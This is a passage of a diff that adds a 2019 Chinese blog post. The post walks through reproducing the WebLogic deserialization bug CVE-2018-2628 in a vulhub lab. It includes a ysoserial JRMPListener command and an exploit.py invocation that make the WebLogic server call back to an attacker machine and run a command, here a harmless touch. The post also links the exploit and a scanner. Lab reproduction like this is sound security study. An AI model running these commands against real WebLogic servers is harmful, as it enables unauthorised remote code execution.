+<li>CVE-2016-3510   </li>
+<li>CVE-2017-3248   </li>
+<li>CVE-2018-2628    </li>
+<li>CVE-2018-2893     </li>
+</ul>
+<p>java反序列化的洞实在太多了，推荐一篇文章<br><a href="https://www.freebuf.com/vuls/179579.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/179579.html</a></p>
+<p>这里复现了CVE-2018-2628</p>
+<h3 id="CVE-2018-2628"><a href="#CVE-2018-2628" class="headerlink" title="CVE-2018-2628"></a>CVE-2018-2628</h3><p>vulhub地址:<a href="https://github.com/vulhub/vulhub/tree/master/weblogic/CVE-2018-2628" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/weblogic/CVE-2018-2628</a></p>
+<p>这个漏洞是属于JRMP(Java远程方法协议)反序列化漏洞，造成了远程代码执行    </p>
+<p>我们需要在攻击机上运行一个<br>JRMPListener监听端口，执行exp后服务器会连接到攻击机上并执行命令</p>
+<p>这里使用ysoserial这个工具运行JRMPListener<br>ysoserial-cve-2018-2628下载:<a href="https://github.com/tdy218/ysoserial-cve-2018-2628/releases" target="_blank" rel="noopener">https://github.com/tdy218/ysoserial-cve-2018-2628/releases</a></p>
+<p>执行</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo java -cp ysoserial-0.1-cve-2018-2628-all.jar ysoseri.exploit.JRMPListener 21 Jdk7u21 "touch /tmp/test.txt"</span><br></pre></td></tr></table></figure>
+<p>监听本机的21端口，并准备执行touch /tmp/test.txt</p>
+<p>exploit.py下载:<a href="https://www.exploit-db.com/exploits/44553" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/44553</a></p>
+<p>执行</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2.7 exploit.py 172.22.0.2 7001 /home/liontree/ysoserial-0.1-cve-2018-2628-all.jar 172.19.0.1 21 JRMPClient</span><br></pre></td></tr></table></figure>
+<ul>
+<li>172.22.0.2和7001是weblogic服务器的ip和端口，    </li>
+<li>/home/liontree/ysoserial-0.1-cve-2018-2628-all.jar是ysoserial所在路径，     </li>
+<li>172.19.0.1和21是攻击机ip和监听端口</li>
+<li>JRMPClient是执行JRMPClient的类，可以选择JRMPClient或JRMPClient2</li>
+</ul>
+<p>此时在weblogic服务器上可以看到生成了/tmp/test.txt，命令执行成功</p>
+<p>最后推荐一个weblogic一键漏洞检测工具Weblogic++<br><a href="https://github.com/rabbitmask/WeblogicScan" target="_blank" rel="noopener">https://github.com/rabbitmask/WeblogicScan</a></p>
+
+  </div>
+  <div class="post-meta">
+    <span class="post-time" style="color:#646060;font-size:13px">2019-06-19</span>
+  </div>
+
+  <div class="post-footer">
+    
+      <ul class="post-tag-list" itemprop="keywords"><li class="post-tag-list-item"><a class="post-tag-list-link" href="/tags/weblogic/" rel="tag">weblogic</a></li></ul>
+    
+
+    <a href="#top" class="top">Back to Top</a>
+  </div>
+</article>
+
+<!-- 评论插件 -->
+
+<footer>
+  2022
+  <span class="author">
+    LionTree
+  </span>
+</footer>
+
+
+    </div>
+  </body>
+</html>
